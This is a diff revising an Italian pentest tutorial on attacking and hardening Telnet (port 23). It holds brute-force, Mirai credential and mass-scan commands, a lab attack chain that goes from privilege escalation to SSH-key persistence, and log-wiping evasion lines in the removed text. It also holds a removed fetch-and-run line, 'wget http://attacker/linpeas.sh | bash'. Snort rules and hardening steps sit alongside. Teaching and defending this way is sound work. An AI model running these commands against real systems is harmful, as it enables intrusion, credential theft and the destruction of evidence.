-├─ nmap --script=telnet-encryption         → Check cifratura (sempre no)
-└─ Wireshark/tcpdump → passive sniffing    → Credential capture
+├─ nmap --script=telnet-encryption         → Encryption check (almost always no)
+└─ tcpdump / Wireshark                     → Passive credential capture
 
 EXPLOITATION
 │
-├─ A) Default credentials → manual test → Telnet access
-├─ B) Brute force → hydra/nmap → valid creds → Telnet access
-├─ C) Packet sniffing → tcpdump/Wireshark → captured creds → reuse
-├─ D) MITM → ettercap/msfconsole → fake server → credential harvest
-└─ E) IoT botnet scan → Mirai wordlist → mass compromise
+├─ A) Default credentials → manual test → Telnet shell
+├─ B) Brute force → hydra / nmap / msf → valid creds → Telnet shell
+├─ C) Sniffing → tcpdump / Wireshark → captured creds → reuse on SSH
+├─ D) MITM → arpspoof / msfconsole fake server → credential harvest
+└─ E) IoT → Mirai default credential list → device access
 
 POST-EXPLOITATION
 │
-├─ uname -a → kernel version check         → Local privesc exploit
+├─ uname -a                                → Kernel version check
 ├─ sudo -l                                 → Sudo misconfiguration
 ├─ find / -perm -4000 2>/dev/null          → SUID binaries
-├─ wget http://attacker/linpeas.sh | bash  → Automated enum
-└─ Persistence → add user / SSH key / cron
+├─ ./linpeas.sh                            → Automated enumeration
+└─ Persistence → SSH key / user / cron
 ```
 
-**Tabella comparativa strumenti:**
+**Confronto strumenti:**
 
-| Tool              | Velocità | Stealth | Use case                       |
-| ----------------- | -------- | ------- | ------------------------------ |
-| nmap              | Media    | Bassa   | Discovery, version detection   |
-| Hydra             | Alta     | Bassa   | Brute force parallelo          |
-| Medusa            | Media    | Media   | Brute force con timeout custom |
-| Metasploit        | Bassa    | Bassa   | Brute force + fake server      |
-| Wireshark/tcpdump | Alta     | Alta    | Passive credential sniffing    |
-| Ettercap          | Media    | Bassa   | Active MITM + sniffing         |
+| Tool                | Velocità | Stealth | Uso                            |
+| ------------------- | -------- | ------- | ------------------------------ |
+| Nmap                | Media    | Bassa   | Discovery e version detection  |
+| Hydra               | Alta     | Bassa   | Brute force parallelo          |
+| Medusa              | Media    | Media   | Brute force con timeout custom |
+| Metasploit          | Bassa    | Bassa   | Brute force e server falso     |
+| Wireshark / tcpdump | Alta     | Alta    | Sniffing passivo               |
+| arpspoof            | Media    | Bassa   | MITM attivo su LAN             |
 
 ***
 
 ## Attack chain completa end-to-end
 
-**Scenario realistico: da scan a persistenza**
+**Scenario realistico in laboratorio: da scan a persistenza**
 
 ```
 [00:00] RECONNAISSANCE
@@ -490,9 +642,7 @@ nc -vn 192.168.1.20 23
 
 [00:05] DEFAULT CREDENTIALS TEST
 telnet 192.168.1.20
-# login: admin
-# password: admin
-# Login incorrect
+# login: admin / password: admin -> Login incorrect
 
 [00:07] BRUTE FORCE
 hydra -l admin -P /usr/share/wordlists/fasttrack.txt telnet://192.168.1.20
@@ -500,146 +650,31 @@ hydra -l admin -P /usr/share/wordlists/fasttrack.txt telnet://192.168.1.20
 
 [00:10] INITIAL ACCESS
 telnet 192.168.1.20
-# login: admin
-# password: password123
-admin@fileserver:~$
+# admin@fileserver:~$
 
-[00:12] ENUMERATION POST-COMPROMISE
-admin@fileserver:~$ sudo -l
+[00:12] POST-COMPROMISE ENUMERATION
+sudo -l
 # (ALL) NOPASSWD: /usr/bin/find
 
 [00:15] PRIVILEGE ESCALATION
-admin@fileserver:~$ sudo find /etc/passwd -exec /bin/bash \;
-root@fileserver:~# id
-# uid=0(root) gid=0(root)
+sudo find /etc/passwd -exec /bin/bash \;
+# root@fileserver:~# id -> uid=0(root)
 
 [00:18] PERSISTENCE
-root@fileserver:~# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADA... attacker@kali' >> /root/.ssh/authorized_keys
-
-root@fileserver:~# useradd -m -s /bin/bash -G sudo backup_user
-root@fileserver:~# echo 'backup_user:BackupPass123!' | chpasswd
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADA... attacker@kali' >> /root/.ssh/authorized_keys
 
 [00:20] LATERAL MOVEMENT
-root@fileserver:~# cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
-# sysadmin:x:1001:1001::/home/sysadmin:/bin/bash
-
-root@fileserver:~# cat /home/sysadmin/.bash_history
-# ssh [email protected]
-# password: SamePasswordEverywhere!
-
-# Credential reuse test
-ssh [email protected]
-# Password: SamePasswordEverywhere!
-sysadmin@dbserver:~$
+cat /home/sysadmin/.bash_history
+# ssh sysadmin@192.168.1.30   <- credential reuse path
 ```
 
-**Timeline stimata:** 20 minuti da scan iniziale a root completo + persistenza + lateral movement.
+Per i passi finali vedi [post-exploitation](https://hackita.it/articoli/post-exploitation/), [SUID](https://hackita.it/articoli/suid/), [GTFOBins](https://hackita.it/articoli/gtfobins/) e [lateral movement](https://hackita.it/articoli/lateral-movement/).
 
 ***
 
-## Detection e tecniche di evasion
+## Telnet nei dispositivi IoT: la lista Mirai
 
-### Lato Blue Team: cosa monitorare
-
-I log Telnet sono critici. Su Linux, Telnet logga su `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (RHEL/CentOS).
-
-**Indicatori di compromissione (IoC) critici:**
-
-* **Brute force:** sequenze di `authentication failure` da stesso IP
-* **Login da IP anomalo:** accessi da geolocazioni inusuali o IP pubblici
-* **Login root:** `session opened for user root` (se PermitRootLogin disabled ma bypassato)
-* **Sniffing:** traffico sulla porta 23 da IP non autorizzati (SPAN/mirror port monitoring)
-* **Multiple sessioni simultanee:** stesso utente da IP diversi contemporaneamente
-
-**Esempio log brute force:**
-
-```
-Jun 15 10:23:15 server in.telnetd[12345]: refused connect from 203.0.113.50
-Jun 15 10:23:17 server in.telnetd[12346]: authentication failure; logname= uid=0 euid=0 tty=ttyp0 ruser= rhost=203.0.113.50
-Jun 15 10:23:19 server in.telnetd[12347]: authentication failure; logname= uid=0 euid=0 tty=ttyp1 ruser= rhost=203.0.113.50
-Jun 15 10:23:23 server in.telnetd[12349]: session opened for user admin by (uid=0)
-```
-
-**IDS signature per Telnet brute force (Snort):**
-
-```
-alert tcp $EXTERNAL_NET any -> $HOME_NET 23 (msg:"Telnet Brute Force Attempt"; flow:to_server,established; content:"login:"; nocase; detection_filter:track by_src, count 5, seconds 60; sid:1000040; rev:1;)
-```
-
-**IDS signature per credential transmission:**
-
-```
-alert tcp $HOME_NET 23 -> $EXTERNAL_NET any (msg:"Telnet Cleartext Credential Leak"; flow:from_server,established; content:"Password:"; nocase; sid:1000041; rev:1;)
-```
-
-### Lato Red Team: evasion e OPSEC
-
-**1. Brute force rallentato:**
-
-```bash
-# Single thread, pausa 10 secondi tra tentativi
-hydra -l admin -P top50.txt -t 1 -W 10 telnet://192.168.1.20
-```
-
-Sotto soglia IDS standard (5 tentativi in 60 secondi).
-
-**2. Evitare pattern riconoscibili:**
-
-```bash
-# Randomizzare ordine username
-shuf users.txt > users_random.txt
-hydra -L users_random.txt -P passwords.txt telnet://192.168.1.20
-```
-
-**3. Connessioni da IP diversi:**
-
-```bash
-# Usare proxy SOCKS o VPN per cambiare IP sorgente
-proxychains telnet 192.168.1.20
-```
-
-**4. Cleanup post-operazione:**
-
-```bash
-# Rimuovere entry da auth.log (se root)
-sed -i '/203.0.113.50/d' /var/log/auth.log
-
-# Rimuovere command history
-history -c
-rm ~/.bash_history
-ln -sf /dev/null ~/.bash_history
-
-# Rimuovere backdoor user
-userdel -r backup_user
-```
-
-***
-
-## Performance e scaling multi-target
-
-### Single target vs subnet scan
-
-Per un singolo target, la scansione completa richiede 5-10 secondi:
-
-```bash
-time nmap -sV -p 23 192.168.1.20
-# real    0m8.123s
-```
-
-Su subnet più ampie (stile IoT botnet scanning):
-
-```bash
-# Fase 1: discovery veloce (30 secondi - 2 minuti su /24)
-masscan -p23 192.168.1.0/24 --rate 1000 -oL telnet_hosts.txt
-
-# Fase 2: estrai IP con porta 23 aperta
-grep "open" telnet_hosts.txt | awk '{print $4}' > targets.txt
-
-# Fase 3: brute force con dizionario Mirai
-cat targets.txt | parallel -j 20 hydra -C mirai_credentials.txt telnet://{}
-```
-
-**Dizionario Mirai (top 10 combinazioni):**
+La botnet **Mirai** (2016) si è diffusa provando via Telnet una breve lista di credenziali di fabbrica su telecamere, DVR e router, spesso su porta 23 e 2323. La lista è pubblica, ed è utile per sapere cosa testare su dispositivi embedded nei tuoi lab:
 
 ```
 root:xc3511
@@ -654,148 +689,223 @@ root:123456
 root:54321
 ```
 
-Questi 10 account compromettono il **\~40% dei device IoT** esposti a Internet.
-
-### Brute force parallelo con GNU Parallel
+Test su un singolo dispositivo del tuo laboratorio:
 
 ```bash
-# Brute force simultaneo su 50 host (2 thread per host = 100 thread totali)
-cat targets.txt | parallel -j 50 hydra -C mirai_credentials.txt -t 2 telnet://{}
+hydra -C mirai_credentials.txt telnet://192.168.1.50
 ```
 
-**Stima performance:** con `-t 2` (2 thread) su 50 host paralleli, si testano **100 credenziali/secondo**. Per 100 combinazioni su 500 target: \~5 minuti.
+Lato difesa, questo è il motivo per cui un dispositivo con Telnet aperto e password di fabbrica va considerato già compromesso.
 
 ***
 
-## Troubleshooting: errori comuni e fix rapidi
+## Detection e evasion
 
-| Errore                                                    | Causa probabile                                     | Fix immediato                                    |
-| --------------------------------------------------------- | --------------------------------------------------- | ------------------------------------------------ |
-| `Connection refused`                                      | Telnet non in ascolto o firewall                    | Verificare con `nmap -p 23` e `nc -vn target 23` |
-| `Network is unreachable`                                  | Routing errato o subnet diversa                     | Verificare `ip route` e connettività con `ping`  |
-| Prompt login non appare                                   | Server sta aspettando option negotiation            | Premere Invio 2-3 volte                          |
-| `Login incorrect` ripetuto                                | Credenziali errate o account bloccato               | Provare credenziali di default o brute force     |
-| Connessione si chiude immediatamente                      | TCP wrapper `/etc/hosts.deny` blocca IP             | Provare da IP diverso o subnet interna           |
-| `EOF from remote side`                                    | Server ha chiuso connessione (ban IP, max sessions) | Attendere o cambiare IP                          |
-| Caratteri strani/corrotti                                 | Mismatch terminal type                              | Settare `TERM=vt100` o `TERM=ansi`               |
-| Hydra `[ERROR] target telnet://X does not support telnet` | Porta 23 aperta ma non Telnet                       | Verificare manualmente con `nc` o `telnet`       |
+### Lato Blue Team: cosa monitorare
 
-***
+Su Linux, Telnet logga su `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (RHEL/CentOS).
 
-## FAQ — domande operative
+**Indicatori di compromissione (IoC):**
 
-**Perché Telnet è considerato così insicuro?**
+* **Brute force:** molte `authentication failure` dallo stesso IP.
+* **Login da IP anomali:** accessi da geolocazioni o reti non previste.
+* **Login root** via Telnet, sempre da considerare grave.
+* **Traffico sulla porta 23** da IP non autorizzati.
+* **Sessioni simultanee** dello stesso utente da IP diversi.
 
-Trasmette **tutto in chiaro**: username, password, comandi, output. Chiunque sulla rete (stesso switch, SPAN port, ISP, MITM) può leggere ogni byte con Wireshark. Non ha autenticazione forte, cifratura o integrità dei dati.
+**Esempio di log da brute force:**
 
-**Esiste Telnet sicuro (TLS/SSL)?**
-
-Esistono implementazioni come `telnet-ssl` e `telnetd-ssl` che wrappano Telnet in TLS, ma sono rarissime. Il 99.9% dei server Telnet è plaintext. La soluzione corretta è usare SSH (porta 22).
-
-**Posso fare brute force su Telnet senza essere bannato?**
-
-La maggior parte dei server Telnet legacy **non ha fail2ban o rate limiting**. È possibile fare brute force aggressivo senza ban. Tuttavia, IDS/IPS aziendali rileveranno comunque.
-
-**Come distinguo Telnet da altri servizi sulla porta 23?**
-
-Banner grab con `nc` o `telnet`. Telnet risponde con option negotiation (byte `0xFF 0xFB ...`). Altri servizi (HTTP misconfigured, backdoor) rispondono diversamente.
-
-**Quali sono le credenziali di default più comuni?**
-
-Top 5: `admin:admin`, `root:root`, `cisco:cisco`, `admin:password`, `root:toor`. Per IoT: `admin:`, `root:xc3511`, `root:vizxv` (Mirai botnet).
-
-**Posso sniffare Telnet su WiFi?**
-
-Sì, se WiFi non è cifrato (Open network) o hai la chiave WPA. Anche su WiFi cifrato, se sei connesso alla stessa rete puoi sniffare traffico broadcast/multicast. Con ARP spoofing puoi intercettare traffico unicast.
-
-**Telnet funziona su porte diverse dalla 23?**
-
-Sì, può essere configurato su qualsiasi porta. Scan completo: `nmap -p- --open -sV <target>` e cercare `telnet` nella colonna SERVICE.
-
-***
-
-## Cheat sheet finale
-
-| Azione                          | Comando                                                                             |
-| ------------------------------- | ----------------------------------------------------------------------------------- |
-| Scan versione + default scripts | `nmap -sV -sC -p 23 <target>`                                                       |
-| Banner grab                     | `nc -vn <target> 23`                                                                |
-| Check encryption support        | `nmap --script=telnet-encryption -p 23 <target>`                                    |
-| Windows NTLM info               | `nmap --script=telnet-ntlm-info -p 23 <target>`                                     |
-| Brute force (Hydra)             | `hydra -l admin -P rockyou.txt telnet://<target>`                                   |
-| Brute force (Nmap)              | `nmap --script=telnet-brute --script-args userdb=u.txt,passdb=p.txt -p 23 <target>` |
-| Brute force (Metasploit)        | `use auxiliary/scanner/telnet/telnet_login`                                         |
-| Default creds (SecLists)        | `hydra -C telnet-betterdefaultpasslist.txt telnet://<target>`                       |
-| Login manuale                   | `telnet <target>`                                                                   |
-| Login porta non standard        | `telnet <target> 2323`                                                              |
-| Packet sniffing (tcpdump)       | `tcpdump -i eth0 -A -n 'port 23' -w telnet.pcap`                                    |
-| Packet sniffing (Wireshark)     | Filter: `tcp.port == 23` → Follow TCP Stream                                        |
-| MITM fake server                | `msfconsole → use auxiliary/server/capture/telnet`                                  |
-| ARP spoofing (Ettercap)         | `ettercap -T -M arp:remote /gateway// /target//`                                    |
-| Cerca CVE                       | `searchsploit telnet <version>`                                                     |
-| Mass scan IoT                   | `masscan -p23 0.0.0.0/0 --rate 10000` (illegale senza permesso!)                    |
-
-***
-
-## Perché la porta 23 Telnet è ancora rilevante nel 2026
-
-Nonostante SSH sia lo standard dal 1995, Telnet persiste in contesti dove la migrazione è impossibile o non prioritaria. I **dispositivi embedded IoT** prodotti tra 2005-2015 (milioni di router domestici, telecamere IP, DVR/NVR, stampanti di rete) hanno firmware che non supporta SSH e non riceverà mai aggiornamenti. Gli **impianti industriali SCADA/ICS** con PLC Siemens, Schneider, ABB installati negli anni 2000 usano Telnet per configurazione e non possono essere spenti per upgrade firmware senza fermare linee produttive. I **laboratori di sicurezza e CTF** mantengono Telnet come teaching tool — Metasploitable, DVWA, VulnHub espongono deliberatamente la porta 23 per scopi didattici. Nei **penetration test aziendali**, trovare Telnet esposto è raro ma quando accade è una **critical finding immediata** con remediation priority P0.
-
-## Differenze chiave: Telnet vs SSH
-
-| Caratteristica          | Telnet (23)          | SSH (22)                   |
-| ----------------------- | -------------------- | -------------------------- |
-| Cifratura               | ❌ Cleartext completo | ✅ AES256-CTR               |
-| Autenticazione          | Password cleartext   | Password + publickey + 2FA |
-| Integrità dati          | ❌ Nessuna            | ✅ HMAC                     |
-| Sniffing resistance     | ❌ Zero               | ✅ Alta                     |
-| Port forwarding         | ❌ No                 | ✅ Sì (-L/-R/-D)            |
-| File transfer           | ❌ No                 | ✅ SCP/SFTP                 |
-| Anno creazione          | 1969                 | 1995                       |
-| Use case legittimo 2026 | Legacy/lab only      | Standard produzione        |
-
-**Quando usare Telnet:** Mai in produzione. Solo lab controllati, CTF, reverse engineering firmware embedded.
-**Quando usare SSH:** Sempre per amministrazione remota sicura.
-
-## Hardening: come chiudere Telnet in produzione
-
-**Opzione 1 — Disabilitare completamente (raccomandato):**
-
-Linux (systemd):
-
-```bash
-systemctl stop telnet.socket
-systemctl disable telnet.socket
-systemctl mask telnet.socket
-apt remove telnetd
+```
+Jun 15 10:23:17 server in.telnetd[12346]: authentication failure; logname= uid=0 euid=0 tty=ttyp0 ruser= rhost=203.0.113.50
+Jun 15 10:23:19 server in.telnetd[12347]: authentication failure; logname= uid=0 euid=0 tty=ttyp1 ruser= rhost=203.0.113.50
+Jun 15 10:23:23 server in.telnetd[12349]: session opened for user admin by (uid=0)
 ```
 
-Linux (xinetd):
+**Regole Snort:**
+
+```
+alert tcp $HOME_NET 23 -> $EXTERNAL_NET any (msg:"Telnet Login Prompt Seen"; flow:from_server,established; content:"login:"; nocase; detection_filter:track by_dst, count 5, seconds 60; sid:1000040; rev:2;)
+```
+
+```
+alert tcp $EXTERNAL_NET any -> $HOME_NET 23 (msg:"Telnet Connection From External Network"; flow:to_server; flags:S; sid:1000041; rev:1;)
+```
+
+La seconda regola è semplice ma efficace: **qualsiasi** connessione Telnet da fuori rete è già un evento da investigare.
+
+### Lato Red Team: OPSEC
+
+**1. Brute force rallentato:**
 
 ```bash
-# /etc/xinetd.d/telnet
+hydra -l admin -P top50.txt -t 1 -W 15 telnet://192.168.1.20
+```
+
+`-t 1` un solo thread, `-W 15` pausa di 15 secondi tra i tentativi: resta sotto le soglie IDS più comuni.
+
+**2. Sniffing passivo invece di brute force:** zero rumore verso il target, ma serve avere accesso al percorso di rete.
+
+**3. Cambiare l'IP sorgente:**
+
+```bash
+proxychains telnet 192.168.1.20
+```
+
+**4. Cleanup (solo in laboratorio o con autorizzazione scritta):**
+
+```bash
+# Remove only your own artifacts
+history -c
+userdel -r backup_user
+```
+
+Nei test reali non si cancellano i log del cliente: si documenta l'attività e si rimuovono solo i propri artefatti (utenti, chiavi, file).
+
+***
+
+## Performance e scansione di più target
+
+Su un singolo host:
+
+```bash
+time nmap -sV -p 23 192.168.1.20
+```
+
+Su una subnet, prima discovery e poi test mirato:
+
+```bash
+# Phase 1: fast discovery of hosts with port 23 open
+masscan -p23 192.168.1.0/24 --rate 1000 -oL telnet_hosts.txt
+
+# Phase 2: extract IPs
+grep "open" telnet_hosts.txt | awk '{print $4}' > targets.txt
+
+# Phase 3: check default credentials on each host
+parallel -j 20 hydra -C mirai_credentials.txt -t 2 telnet://{} < targets.txt
+```
+
+Usa questi comandi solo su reti tue o autorizzate per iscritto: la scansione massiva di indirizzi altrui è illegale.
+
+***
+
+## Come configurare Telnet in un laboratorio
+
+Per provare gli attacchi di questo articolo ti serve un Telnet server di test. **Mai su una macchina esposta a Internet.**
+
+**Ubuntu / Debian:**
+
+```bash
+sudo apt update && sudo apt install telnetd -y
+```
+
+Verifica che sia in ascolto:
+
+```bash
+ss -tlnp | grep ':23'
+```
+
+```
+LISTEN 0  128  0.0.0.0:23  0.0.0.0:*
+```
+
+Crea un utente di test:
+
+```bash
+sudo useradd -m -s /bin/bash labuser
+echo 'labuser:labpass123' | sudo chpasswd
+```
+
+Prova da un'altra macchina:
+
+```bash
+telnet 192.168.1.100
+```
+
+In alternativa usa **Metasploitable 2**, dove Telnet è già attivo con `msfadmin:msfadmin`.
+
+***
+
+## Telnet vs SSH: differenze e sicurezza
+
+| Caratteristica           | Telnet (23)                      | SSH (22)                        |
+| ------------------------ | -------------------------------- | ------------------------------- |
+| Cifratura                | No, tutto in chiaro              | Sì (AES, ChaCha20)              |
+| Autenticazione           | Password in chiaro               | Password, chiavi pubbliche, 2FA |
+| Integrità dei dati       | Nessuna                          | Sì (HMAC)                       |
+| Resistenza allo sniffing | Nessuna                          | Alta                            |
+| Port forwarding          | No                               | Sì (`-L`, `-R`, `-D`)           |
+| Trasferimento file       | No                               | Sì (SCP, SFTP)                  |
+| Anno di nascita          | Fine anni '60 (RFC 854 nel 1983) | 1995                            |
+| Uso legittimo nel 2026   | Legacy e laboratorio             | Standard in produzione          |
+
+**Telnet vs SSH security:** con Telnet un attaccante sulla rete legge credenziali e comandi. Con SSH vede solo traffico cifrato. Per questo la migrazione da Telnet a SSH è la prima remediation in qualsiasi report.
+
+**Quando usare Telnet:** mai per amministrazione in produzione. Solo test di porte, test SMTP/HTTP a mano, laboratori, apparati legacy isolati.
+**Quando usare SSH:** sempre per l'amministrazione remota.
+
+***
+
+## Hardening: come disabilitare Telnet e passare a SSH
+
+### Passo 1: trova dove Telnet è attivo
+
+```bash
+# On the local host
+ss -tlnp | grep ':23'
+
+# On the network (authorized scan)
+nmap -p 23 --open 192.168.1.0/24 -oG telnet_exposed.txt
+```
+
+### Passo 2: disabilitalo
+
+**Linux (systemd):**
+
+```bash
+sudo systemctl stop telnet.socket
+sudo systemctl disable telnet.socket
+sudo systemctl mask telnet.socket
+sudo apt remove telnetd -y
+```
+
+**Linux (xinetd):** in `/etc/xinetd.d/telnet`:
+
+```
 service telnet
 {
     disable = yes
 }
-systemctl restart xinetd
 ```
 
-Cisco IOS:
+```bash
+sudo systemctl restart xinetd
+```
+
+**Windows:** disattiva il client se non serve:
+
+```cmd
+dism /online /Disable-Feature /FeatureName:TelnetClient
+```
+
+**Cisco IOS:** abilita SSH e vieta Telnet sulle linee VTY.
 
 ```
-Router(config)# no transport input telnet
-Router(config)# transport input ssh
+Router(config)# hostname R1
+Router(config)# ip domain-name corp.local
+Router(config)# crypto key generate rsa modulus 2048
+Router(config)# ip ssh version 2
 Router(config)# line vty 0 4
 Router(config-line)# transport input ssh
+Router(config-line)# login local
+Router(config-line)# end
 ```
 
-**Opzione 2 — Restringere accesso (se disabilitare è impossibile):**
+### Passo 3: se non puoi disabilitarlo, limitalo
 
-TCP Wrappers (`/etc/hosts.allow`):
+**TCP Wrappers** (`/etc/hosts.allow`):
 
 ```
-in.telnetd: 192.168.1.0/24, 10.0.0.0/8
+in.telnetd: 192.168.1.0/24
 ```
 
 `/etc/hosts.deny`:
@@ -804,18 +914,18 @@ in.telnetd: 192.168.1.0/24, 10.0.0.0/8
 in.telnetd: ALL
 ```
 
-Iptables:
+**Firewall (iptables):**
 
 ```bash
-# Permetti Telnet solo da IP management
+# Allow Telnet only from the management host
 iptables -A INPUT -p tcp --dport 23 -s 192.168.100.50 -j ACCEPT
 iptables -A INPUT -p tcp --dport 23 -j DROP
 ```
 
-**Opzione 3 — TLS wrapper (raro, meglio SSH):**
+### Passo 4: se serve TLS (soluzione di ripiego)
 
 ```bash
-apt install stunnel4
+sudo apt install stunnel4 -y
 ```
 
 `/etc/stunnel/telnet-tls.conf`:
@@ -823,26 +933,106 @@ apt install stunnel4
 ```
 [telnet-ssl]
 accept = 992
-connect = 23
+connect = 127.0.0.1:23
 cert = /etc/ssl/certs/server.pem
 key = /etc/ssl/private/server.key
 ```
 
-Client connette a porta 992 con TLS, stunnel decifra e forward a Telnet locale porta 23.
+Il client si collega alla 992 con TLS e stunnel inoltra a Telnet in locale. Funziona, ma la scelta giusta resta SSH.
 
-## OPSEC: stealth per Telnet (scenario difensivo)
+### Passo 5: verifica
 
-In operazioni Red Team autorizzate:
+```bash
+nmap -p 23 <target>
+```
 
-1. **Evitare Telnet se possibile** — Troppo rumoroso, troppo facile da rilevare
-2. **Se obbligatorio:** Brute force rallentato `-t 1 -W 15`, sotto soglia IDS
-3. **Preferire sniffing passivo** — Wireshark/tcpdump su SPAN port, zero rumore
-4. **Cleanup completo:** Rimuovere log entries, command history, backdoor users
-
-**In ambiente CTF:** Telnet è spesso il path più veloce verso initial access — non serve stealth.
+Il risultato atteso è `closed` o `filtered`.
 
 ***
 
-> **Disclaimer:** Tutti i comandi e le tecniche descritte in questo articolo sono destinati esclusivamente all'uso in ambienti autorizzati: laboratori personali, macchine virtuali CTF come Metasploitable/HackTheBox/TryHackMe e penetration test con autorizzazione scritta del proprietario del sistema. L'accesso non autorizzato a sistemi informatici è un reato penale in Italia (art. 615-ter c.p.) e nella maggior parte delle giurisdizioni internazionali. Lo sniffing di traffico di rete altrui senza consenso è reato (art. 617-quater c.p.). L'autore e HackIta declinano ogni responsabilità per usi impropri di queste informazioni. Per ulteriori dettagli sul protocollo Telnet, consultare RFC 854 ([https://www.rfc-editor.org/rfc/rfc854.html](https://www.rfc-editor.org/rfc/rfc854.html)) e RFC 855 ([https://www.rfc-editor.org/rfc/rfc855.html](https://www.rfc-editor.org/rfc/rfc855.html)).
+## Troubleshooting: errori comuni e fix
 
-Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
+| Errore                                 | Causa probabile                                 | Fix                                            |
+| -------------------------------------- | ----------------------------------------------- | ---------------------------------------------- |
+| `Connection refused`                   | Telnet non in ascolto o firewall                | Verifica con `nmap -p 23` e `nc -vn target 23` |
+| `Network is unreachable`               | Routing errato o subnet diversa                 | Controlla `ip route` e fai `ping`              |
+| `'telnet' is not recognized` (Windows) | Client Telnet non installato                    | Abilitalo con `dism` (vedi sopra)              |
+| Il prompt di login non appare          | Il server aspetta la negoziazione delle opzioni | Premi invio 2-3 volte                          |
+| `Login incorrect` ripetuto             | Credenziali sbagliate o account bloccato        | Prova le default o il brute force              |
+| La connessione si chiude subito        | TCP wrapper (`hosts.deny`) blocca il tuo IP     | Prova da una subnet permessa                   |
+| `EOF from remote side`                 | Il server ha chiuso la connessione              | Aspetta o cambia IP                            |
+| Caratteri strani                       | Terminal type non compatibile                   | Imposta `TERM=vt100` o `TERM=ansi`             |
+| Non riesci a uscire dalla sessione     | Il client non risponde ai comandi               | `Ctrl + ]` poi `quit`                          |
+| Hydra: `does not support telnet`       | Porta 23 aperta ma non è Telnet                 | Verifica a mano con `nc`                       |
+
+***
+
+## FAQ
+
+**Qual è la porta predefinita di Telnet?**
+La **23/TCP**. Su dispositivi IoT trovi spesso anche la 2323.
+
+**Perché Telnet è insicuro?**
+Perché trasmette tutto in chiaro: username, password, comandi e output. Chiunque sulla rete può leggerli con uno sniffer.
+
+**Come si usa Telnet?**
+`telnet <host> <porta>`. Senza porta usa la 23. Per testare una porta basta vedere se la connessione si apre.
+
+**Come si esce da Telnet?**
+`Ctrl + ]` e poi `quit`. Dentro la shell remota basta `exit`.
+
+**A cosa serve Telnet oggi?**
+Per amministrare apparati legacy, testare porte TCP e provare a mano protocolli testuali come SMTP e HTTP.
+
+**Telnet è lo stesso di SSH?**
+No. Fanno lo stesso lavoro (shell remota) ma SSH cifra tutto, Telnet no.
+
+**Come si attiva Telnet su Windows?**
+`dism /online /Enable-Feature /FeatureName:TelnetClient` da prompt come amministratore.
+
+**Come si fa un test SMTP con Telnet?**
+`telnet mail.example.com 25`, poi `EHLO`, `MAIL FROM`, `RCPT TO`, `DATA`. Vedi la sezione dedicata.
+
+**Esiste un Telnet sicuro?**
+Esistono implementazioni con TLS (`telnet-ssl`) o wrapper come stunnel, ma sono rare. La soluzione corretta è SSH.
+
+**Posso fare brute force su Telnet senza essere bloccato?**
+I Telnet legacy spesso non hanno fail2ban né rate limiting. Gli IDS aziendali però rilevano comunque il traffico. Solo in ambienti autorizzati.
+
+**Come distinguo Telnet da altri servizi sulla porta 23?**
+Con un banner grab: Telnet invia byte di negoziazione (`0xFF 0xFB ...`). Un servizio diverso risponde in altro modo.
+
+**Posso sniffare Telnet su WiFi?**
+Sì, in una rete tua: su WiFi aperto vedi il traffico, su WiFi cifrato devi essere connesso alla rete e in posizione MITM.
+
+***
+
+## Cheat sheet finale
+
+| Azione                         | Comando                                                                             |
+| ------------------------------ | ----------------------------------------------------------------------------------- |
+| Scan versione + script default | `nmap -sV -sC -p 23 <target>`                                                       |
+| Banner grab                    | `nc -vn <target> 23`                                                                |
+| Controllo cifratura            | `nmap --script=telnet-encryption -p 23 <target>`                                    |
+| Info NTLM Windows              | `nmap --script=telnet-ntlm-info -p 23 <target>`                                     |
+| Brute force Hydra              | `hydra -l admin -P rockyou.txt telnet://<target>`                                   |
+| Brute force Nmap               | `nmap --script=telnet-brute --script-args userdb=u.txt,passdb=p.txt -p 23 <target>` |
+| Brute force Metasploit         | `use auxiliary/scanner/telnet/telnet_login`                                         |
+| Credenziali di default         | `hydra -C telnet-betterdefaultpasslist.txt telnet://<target>`                       |
+| Login manuale                  | `telnet <target>`                                                                   |
+| Porta non standard             | `telnet <target> 2323`                                                              |
+| Test porta                     | `telnet <target> <porta>`                                                           |
+| Test porta Windows             | `Test-NetConnection -ComputerName <target> -Port 23`                                |
+| Uscita da Telnet               | `Ctrl + ]` poi `quit`                                                               |
+| Abilita client Windows         | `dism /online /Enable-Feature /FeatureName:TelnetClient`                            |
+| Cattura traffico               | `tcpdump -i eth0 -n 'port 23' -w telnet.pcap`                                       |
+| Leggi lo stream                | `tshark -r telnet.pcap -q -z follow,tcp,ascii,0`                                    |
+| Server falso                   | `use auxiliary/server/capture/telnet`                                               |
+| Cerca CVE                      | `searchsploit telnetd`                                                              |
+| Disabilita Telnet (systemd)    | `systemctl disable --now telnet.socket`                                             |
+
+***
+
+> **Disclaimer:** Tutti i comandi e le tecniche descritte in questo articolo sono destinati esclusivamente all'uso in ambienti autorizzati: laboratori personali, macchine virtuali CTF come Metasploitable/HackTheBox/TryHackMe e penetration test con autorizzazione scritta del proprietario del sistema. L'accesso non autorizzato a sistemi informatici è un reato penale in Italia (art. 615-ter c.p.) e nella maggior parte delle giurisdizioni internazionali. L'intercettazione di comunicazioni altrui senza consenso è reato (art. 617-quater c.p.). L'autore e HackIta declinano ogni responsabilità per usi impropri di queste informazioni. Per ulteriori dettagli sul protocollo Telnet, consultare RFC 854 ([https://www.rfc-editor.org/rfc/rfc854.html](https://www.rfc-editor.org/rfc/rfc854.html)) e RFC 855 ([https://www.rfc-editor.org/rfc/rfc855.html](https://www.rfc-editor.org/rfc/rfc855.html)).
+
+Vuoi supportare HackIta? Visita [https://hackita.it/supporto](https://hackita.it/supporto/) per donazioni. Per penetration test professionali e formazione 1:1, scopri [https://hackita.it/servizi](https://hackita.it/servizi/).
